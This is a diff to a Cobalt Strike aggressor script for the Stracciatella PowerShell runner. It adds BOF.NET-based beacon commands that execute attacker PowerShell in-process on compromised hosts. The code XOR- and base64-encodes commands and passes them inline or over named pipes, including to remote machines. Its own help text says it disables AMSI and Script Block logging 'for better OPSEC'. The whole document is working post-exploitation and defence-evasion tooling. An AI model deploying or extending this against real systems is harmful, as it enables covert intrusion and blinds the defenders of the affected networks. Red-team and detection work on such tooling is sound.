@@ -19,19 +19,12 @@ global('$STRACCIATELLA_PATH %IMPORTED_SCRIPTS %IMPORTED_CMDLETS $STRACCIATELLA_P
 $STRACCIATELLA_PATH = script_resource("Stracciatella.exe");
 $STRACCIATELLA_PIPE_READ_TIMEOUT = 10 * 60 * 1000;
 
-#
-# If there's BOF.NET loaded in Cobalt Strike, prefer `bofnet_jobassembly` command over `execute-assembly`.
-# This is useful when we want to switch our tactics to running inline/in-process via BOF.NET instead of fork & run.
-#
-$FAVOR_BOFNET_INSTEAD_OF_EXECUTE_ASSEMBLY = "true";
-
-
 %IMPORTED_SCRIPTS = %();
 %IMPORTED_CMDLETS = %();
 
 beacon_command_register(
     "stracciatella",
-    "Runs mgeeky/Stracciatella Powershell runspace being even safer version of powerpick.",
+    "Runs Powershell commands in a safe Stracciatella runspace.",
     "Use: stracciatella [-v] <command>\n\nDescription: Runs Stracciatella in a similar fashion to powerpick/powershell.\nIf '-v' is given, will result in verbose output from Stracciatella.\nThat will create a Powershell Runspace with Script Block logging and AMSI disabled for better OPSEC.");
 
 beacon_command_register(
@@ -63,6 +56,17 @@ beacon_command_register(
     "bofnet_loadstracciatella",
     "Loads Stracciatella into BOF.NET.",
     "Loads Stracciatella into BOF.NET. Works only if BOF.NET is available in Cobalt Strike.");
+
+beacon_command_register(
+    "bofnet_stracciatella",
+    "Runs Powershell commands in a safe Stracciatella runspace via BOF.NET.",
+    "Use: bofnet_stracciatella [-v] <command>\n\nDescription: Runs Stracciatella via bofnet_jobassembly (if one is used).\nIf '-v' is given, will result in verbose output from Stracciatella.\nThat will create a Powershell Runspace with Script Block logging and AMSI disabled for better OPSEC.");
+
+beacon_command_register(
+    "bofnet_stracciatella_script",
+    "Preloads a specified Powershell script and launches given command with parameters (via BOF.NET).",
+    "Use: bofnet_stracciatella_script <scriptpath> <command>\n\nDescription: This function at a single run preloads a specified custom\nPowershell script and adds separator (semicolon) followed by <command> to run.\nUseful when we need to provide a Powershell script that for instance reflectively loads .NET assembly (Import-Module)\nand then we need to invoke that loaded module.\nStracciatella will be loaded via bofnet_jobassembly");
+
 
 $has_bofnet_commands = false;
 
@@ -220,12 +224,17 @@ sub executeAssembly {
     $args = $3;
     $firstScriptBytes = $4;
     $msg = $5;
+    $mode = $6;
 
     $useBofnet = false;
 
-    if($has_bofnet_commands == true) {
-        if($FAVOR_BOFNET_INSTEAD_OF_EXECUTE_ASSEMBLY eq "true") {
+    if($mode == true) {
+        if($has_bofnet_commands == true) {
             $useBofnet = true;
+        }
+        else {
+            berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and stracciatella.cna before using this.");
+            return;
         }
     }
 
@@ -248,20 +257,21 @@ sub executeAssembly {
     else 
     {
         btask($bid, "Tasked beacon to run Stracciatella $msg $+ : \c7" . getFileName($localpath) . " $args \o");
-        println("Stracciatella: augmented execute-assembly: bid='" . $bid . "', localpath='" . $localpath . "', args='" . $args . "'");
+        println("Stracciatella: augmented execute-assembly: bid='" . $bid . "', localpath='" . $localpath . "', args='-l ' $+ $firstScriptBytes $+ ' " . $args . "'");
 
-        bexecute_assembly!($bid, $localpath, $args);
+        bexecute_assembly!($bid, $localpath, " -l ' $+ $firstScriptBytes $+ ' $args");
     }
 }
 
 sub runStracciatella {
-    local('$bid $args $args0 $s $imported $cradle $scriptContents $opts $key $enc $verbose $pipename');
+    local('$bid $args $args0 $s $imported $cradle $scriptContents $opts $key $enc $verbose $pipename $mode');
     $bid = $1;
     $verbose = $2;
     $machine = $3;
     $pipename = $4;
     $args = $5;
     $customScript = $6;
+    $mode = $7;
 
     $args0 = $args;
 
@@ -304,9 +314,15 @@ sub runStracciatella {
     }
 
     $key = rand(254) + 1;
-
+    $opts = "";
     $enc = base64_encode(str_xor($args, chr($key)));
-    $opts = "$verbose $+ -x $key -p $pipename -e -t $STRACCIATELLA_PIPE_READ_TIMEOUT";
+
+    if(strlen($enc) < 20000) {
+        $opts = "$verbose $+ -x $key -e -c \" $+ $enc $+ \"";
+    }
+    else {
+        $opts = "$verbose $+ -x $key -p $pipename -e -t $STRACCIATELLA_PIPE_READ_TIMEOUT";
+    }
 
     $msg = "";
 
@@ -325,29 +341,21 @@ sub runStracciatella {
     }
 
     if($machine eq ".") {
-        executeAssembly($1, $STRACCIATELLA_PATH, $opts, $firstScriptBytes, $msg);
+        executeAssembly($1, $STRACCIATELLA_PATH, $opts, $firstScriptBytes, $msg, $mode);
     }
 
-    writePipe($1, $machine, $pipename, $enc);
+    if(strlen($enc) >= 20000) {
+        writePipe($1, $machine, $pipename, $enc);
+    }
 }
 
 alias bofnet_loadstracciatella {
-    $useBofnet = false;
-
-    if($has_bofnet_commands == true) {
-        if($FAVOR_BOFNET_INSTEAD_OF_EXECUTE_ASSEMBLY eq "true") {
-            $useBofnet = true;
-        }
+    if($has_bofnet_commands == false) {
+        berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and stracciatella.cna before using this.");
+        return;
     }
 
-    if($useBofnet) 
-    {
-        fireAlias($1, "bofnet_load", $STRACCIATELLA_PATH);
-    }
-    else 
-    {
-        berror($1, "BOF.NET is not loaded into Cobalt Strike. Load it first before using this alias.");
-    }
+    fireAlias($1, "bofnet_load", $STRACCIATELLA_PATH);
 }
 
 alias stracciatella-import {
@@ -397,7 +405,28 @@ alias stracciatella {
     }
 
     $pipename = [java.util.UUID randomUUID];
-    runStracciatella($1, $verbose, ".", $pipename, $args, "");
+    runStracciatella($1, $verbose, ".", $pipename, $args, "", false);
+}
+
+alias bofnet_stracciatella {
+    local('$args0 $args $verbose $pipename');
+
+    if($has_bofnet_commands == false) {
+        berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and stracciatella.cna before using this.");
+        return;
+    }
+
+    $args0 = substr($0, strlen("bofnet_stracciatella "));
+    $args = $args0;
+
+    $verbose = "";
+    if ('bofnet_stracciatella -v *' iswm $0) {
+        $verbose = "-v ";
+        $args = substr($0, strlen("bofnet_stracciatella -v "));
+    }
+
+    $pipename = [java.util.UUID randomUUID];
+    runStracciatella($1, $verbose, ".", $pipename, $args, "", true);
 }
 
 alias stracciatella-remote {
@@ -430,7 +459,7 @@ alias stracciatella-remote {
     $pipename = substr($args, 0, $pos);
     $args = substr($args, $pos + 1);
 
-    runStracciatella($1, $verbose, $machine, $pipename, $args, "");
+    runStracciatella($1, $verbose, $machine, $pipename, $args, "", false);
 }
 
 alias stracciatella-script {
@@ -458,7 +487,40 @@ alias stracciatella-script {
     $args = substr($args, $pos + 1);
 
     $pipename = [java.util.UUID randomUUID];
-    runStracciatella($1, $verbose, ".", $pipename, $args, $customScript);
+    runStracciatella($1, $verbose, ".", $pipename, $args, $customScript, false);
+}
+
+alias bofnet_stracciatella_script {
+    local('$args0 $args $verbose $pipename');
+
+    if($has_bofnet_commands == false) {
+        berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and stracciatella.cna before using this.");
+        return;
+    }
+
+    $args0 = substr($0, strlen("bofnet_stracciatella_script "));
+    $args = $args0;
+
+    println("bofnet_stracciatella_script $args0");
+
+    $verbose = "";
+    if ('bofnet_stracciatella_script -v *' iswm $0) {
+        $verbose = "-v ";
+        $args = substr($0, strlen("bofnet_stracciatella_script -v "));
+    }
+
+    $pos = indexOf($args, " ", 0);
+
+    if(($pos is $null) || ($pos + 1) > strlen($args)) {
+        berror($1, "Usage: bofnet_stracciatella_script [-v] <path> <command>\n\nNo path or command specified to run stracciatella with preloaded custom script.");
+        return;
+    }
+
+    $customScript = substr($args, 0, $pos);
+    $args = substr($args, $pos + 1);
+
+    $pipename = [java.util.UUID randomUUID];
+    runStracciatella($1, $verbose, ".", $pipename, $args, $customScript, true);
 }
 
 checkBofnet();
